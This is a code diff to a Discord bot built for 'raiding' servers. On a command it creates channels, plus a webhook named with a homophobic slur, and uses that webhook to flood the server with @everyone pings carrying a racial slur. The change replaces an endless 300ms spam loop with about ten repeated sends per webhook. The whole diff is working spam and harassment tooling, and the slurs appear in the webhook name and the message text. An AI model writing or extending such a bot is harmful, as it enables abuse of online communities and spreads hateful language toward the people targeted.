@@ -38,11 +38,16 @@ client.on("message", async (message) => {
                     message.guild.createChannel('haha admin go grr', 'text').then(m =>{
                         const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
-                            const case1hook = new Discord.WebhookClient(w.id, w.token)
-                            while(Boolean(client.channels.get(mch1)) == true){
-                              case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                              sleep(300)
-                            }
+                          const case1hook = new Discord.WebhookClient(w.id, w.token)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
                         })
                     })
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -53,11 +58,17 @@ client.on("message", async (message) => {
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
                         const mch2 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
-                            const case2hook = new Discord.WebhookClient(w.id, w.token)
-                            while(Boolean(client.channels.get(mch2)) == true) {
-                              case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                              sleep(300)
-                            }
+                          const case2hook = new Discord.WebhookClient(w.id, w.token)                        
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                          case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
